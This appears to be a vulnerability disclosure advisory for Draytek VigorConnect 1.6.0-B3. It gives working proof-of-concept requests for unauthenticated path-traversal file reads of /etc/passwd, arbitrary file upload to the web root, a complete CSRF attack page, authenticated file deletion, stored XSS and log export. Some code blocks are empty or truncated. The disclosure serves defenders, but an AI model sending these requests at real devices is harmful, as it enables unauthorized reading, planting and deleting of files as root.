**CWE: 22**

A local file inclusion vulnerability exists in Draytek VigorConnect 1.6.0-B3 in the file download functionality of the DownloadFileServlet endpoint. An unauthenticated attacker could leverage this vulnerability to download arbitrary files from the underlying operating system with root privileges.
##### **Proof of concept**

Making a GET request to the following urls will download /etc/passwd or win.ini from the target system (depending on whether the target system is windows or linux).

**Linux:**
```
https://<ip-of-VigorConnect>:4433/ACSServer/DownloadFileServlet?show_file_name=../../../../../../etc/passwd&type=uploadfile&path=anything
```

**Windows:**
```
https://<ip-of-VigorConnect>:4433/ACSServer/DownloadFileServlet?show_file_name=../../../../../../windows/win.ini&type=uploadfile&path=anything
```
#### CVE-2021-20124 - Unauthenticated Local File Inclusion - WebServlet

**CVSSv3 Base Score: 7.5**
**CVSSv3 Vector: AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N**

CWE: 22

A local file inclusion vulnerability exists in Draytek VigorConnect 1.6.0-B3 in the file download functionality of the WebServlet endpoint. An unauthenticated attacker could leverage this vulnerability to download arbitrary files from the underlying operating system with root privileges.
##### **Proof of concept**

Making a GET request to the following urls will download /etc/passwd or win.ini from the target system (depending on whether the target system is windows or linux).

**Linux:**

```

**Windows:**
```
https://<ip-of-VigorConnect>:4433/ACSServer/WebServlet?act=getMapImg_acs2&filename=../../../../../../../windows/win.ini
```
#### CVE-2021-20125 - Unauthenticated File Upload / Directory Traversal

**CVSSv3 Base Score: 9.8**
**CVSSv3 Vector: AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H**
**CWE: 434**

An arbitrary file upload and directory traversal vulnerability exists in the file upload functionality of DownloadFileServlet  in Draytek VigorConnect 1.6.0-B3. An unauthenticated attacker could leverage this vulnerability to upload files to any location on the target operating system with root privileges.
##### **Proof of concept**

The below POST request will upload a HTML file containing some sample Javascript to the web root directory of the VigorConnect application.

**Request:**
```
POST /ACSServer/DownloadFileServlet?flag=uploadFile&file=%5Bobject%20File%5D&path=./RootGroup/../../../Web&userId=undefined&username=root HTTP/2
Host: <ip-of-VigorConnect>:4433
Content-Type: multipart/form-data; boundary=---------------------------7220079814097465115294022946
Content-Length: 377

-----------------------------7220079814097465115294022946
Content-Disposition: form-data; name="Filename"

anything
-----------------------------7220079814097465115294022946
Content-Disposition: form-data; name="Filedata"; filename="test.html"
Content-Type: text/html

<script>alert('Stored XSS')</script>
-----------------------------7220079814097465115294022946--
```

Navigating to https://<ip-of-VigorConnect>:443/web/test.html will trigger the stored XSS vulnerability from the example.
#### CVE-2021-20126 - Cross-site request forgery

**CVSSv3 Base Score:  6.3**
**CVSSv3 Vector: AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:L**
**CWE: 352**

Draytek VigorConnect 1.6.0-B3 lacks cross-site request forgery protections and does not sufficiently verify whether a well-formed, valid, consistent request was intentionally provided by the user who submitted the request.

An attacker could exploit this issue by creating a dummy page that would execute Javascript in an authenticated user's session if they were tricked into using the malicious dummy page.
##### **Proof of concept**

The below HTML and Javascript can be used to stage a dummy example site. If a user browses to the dummy site and submits the form, a malicious request will be sent on behalf of the user that will upload a dummy malicious file to the VigorConnect server.

Below is an example dummy site for demonstration purposes. Note that to test this you will need to change the IP address in the HTML page to that of your VigorConnect install.

**CSRF Proof-of-concept page**
```
<html>
  <body>
  <script>history.pushState('', '', '/')</script>
    <script>
      function submitRequest()
      {
        var xhr = new XMLHttpRequest();
        xhr.open("POST", "https:\/\/<ip-of-VigorConnect>:4433\/ACSServer\/DownloadFileServlet?flag=uploadFile&file=%5Bobject%20File%5D&path=.%2FRootGroup&userId=undefined&username=root", true);
        xhr.setRequestHeader("Accept", "application\/json, text\/plain, *\/*");
        xhr.setRequestHeader("Accept-Language", "en-US,en;q=0.5");
        xhr.setRequestHeader("Content-Type", "multipart\/form-data; boundary=---------------------------34240296286634720371241953395");
        xhr.withCredentials = true;
        var body = "-----------------------------34240296286634720371241953395\r\n" +
          "Content-Disposition: form-data; name=\"Filename\"\r\n" +
          "\r\n" +
          "index.html\r\n" +
          "-----------------------------34240296286634720371241953395\r\n" +
          "Content-Disposition: form-data; name=\"Filedata\"; filename=\"index.html\"\r\n" +
          "Content-Type: text/html\r\n" +
          "\r\n" +
          "\x3cscript\x3ealert(\'Stored XSS\')\x3c/script\x3e\n" +
          "\r\n" +
          "-----------------------------34240296286634720371241953395--\r\n";
        var aBody = new Uint8Array(body.length);
        for (var i = 0; i < aBody.length; i++)
          aBody[i] = body.charCodeAt(i);
        xhr.send(new Blob([aBody]));
      }
    </script>
    <form action="#">
      <input type="button" value="Submit request" onclick="submitRequest();" />
    </form>
  </body>
</html>
```
#### CVE-2021-20127 - Authenticated Arbitrary File Deletion

**CVSSv3 Base Score: 8.1**
**CVSSv3 Vector: AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:H**
**CWE: 284**

An arbitrary file deletion vulnerability exists in the file delete functionality of the Html5Servlet endpoint of Draytek VigorConnect 1.6.0-B3. This allows an authenticated user to arbitrarily delete files in any location on the target operating system with root privileges.

The complexity of exploiting this vulnerability is increased slightly since this request to the Html5Servlet endpoint is base64 encoded and encrypted. However, since the requests are encrypted in the browser using functions from encrypt.js, they can easily be decrypted, manipulated and re-encrypted on the fly.

For instance, using the javascript console in a browser's developer tools to call isBuildVersion.encrypt() and isBuildVersion.decrypt() allows a user to encrypt and decrypt any payloads necessary.

##### **Proof of concept**

This PoC assumes VigorConnect is running on Linux and that the user is authenticated (and using a valid DrTekAcsLiteHtml cookie).
To validate the existence of this vulnerability you will first need to create a file in /tmp called test.txt (or a similar file on windows).

Next you can send the below POST request which will delete a file in /tmp called test.txt.

**Example Request:**
```
POST /ACSServer/Html5Servlet HTTP/2
Host: <VigorConnectIP>:4433
Cookie: DrayTekAcsLiteHtml=e641ab176731fffbb077151f0b68c039

```

The payload in the example above, when unencrypted, looks as follows:
```
{\"act\":\"ProvisionGeneralUploadFile\",
  \"files\":[{\"deleteAction\":1,
    \"directory\":\"./RootGroup\",
    \"fileName\":\"../../../../../../../../tmp/test.txt\",
    \"file_id\":0,\"lastModified\":\"2021/08/23 14:13:18\",
    \"property\":\"html file\",
    \"size\":\"37 B\",
    \"uniqueId\":1629724398}],
  \"del_type\":\"0\",
  \"actionType\":3}
```
Now if you check for /tmp/test.txt you should find that it has been removed.
#### CVE-2021-20128 - Stored Cross-Site Scripting (XSS)

**CVSSv3 Base Score:  3.5**
**CVSSv3 Vector: AV:N/AC:L/PR:H/UI:R/S:U/C:L/I:L/A:N**
**CWE: 79**

The Profile Name field in the floor plan (Network Menu) page in Draytek VigorConnect 1.6.0-B3 was found to be vulnerable to stored XSS, as user input is not properly sanitized.
##### **Proof of concept**

We trigger the alert by setting the Profile name field to:
"><script>alert('XSS')</script>
```

Note that you will need to add an authenticated DrayTekAcsLiteHtml cookie and add the IP address of your target VigorConnect install.

#### CVE-2021-20129 - Information Disclosure: Unauthenticated access to potentially sensitive logs

**CVSSv3 Base Score: 5.3**
**CVSSv3 Vector: AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N**
**CWE: 200**

An information disclosure vulnerability exists in Draytek VigorConnect 1.6.0-B3, allowing an unauthenticated attacker to export system logs.
An attacker could leverage sensitive information found in these logs to learn about the target device which they could use to launch further attacks.
##### **Proof of concept:**

Logs can be downloaded unauthenticated with the following request:

**https://<ip-of-VigorConnect>:4433/ACSServer/ExportServlet?type=SystemLog**

You can change the type to download other types of logs, for example you can change the type from SystemLog to ActionLog and that will download the action logs
